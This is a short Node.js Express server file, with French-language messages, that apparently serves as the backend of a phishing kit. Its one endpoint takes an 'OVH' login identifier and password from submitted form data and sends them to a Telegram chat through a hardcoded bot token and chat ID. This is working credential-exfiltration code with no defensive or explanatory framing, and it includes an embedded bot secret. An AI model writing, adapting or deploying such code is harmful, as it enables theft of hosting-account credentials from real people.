// server.js
const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.json());

const BOT_TOKEN = "5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o";
const CHAT_ID = "-868620860";

app.post("/sendTelegram", async (req, res) => {
  const { identifiant, password } = req.body;

  if (!identifiant || !password) {
    return res.status(400).json({ error: "Champs manquants" });
  }

  const message = `Identifiant OVH: ${identifiant}\nMot de passe: ${password}`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
      }
    );

    if (!response.ok) throw new Error("Erreur Telegram API");

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(3000, () => {
  console.log("Serveur lancé sur le port 3000");
});
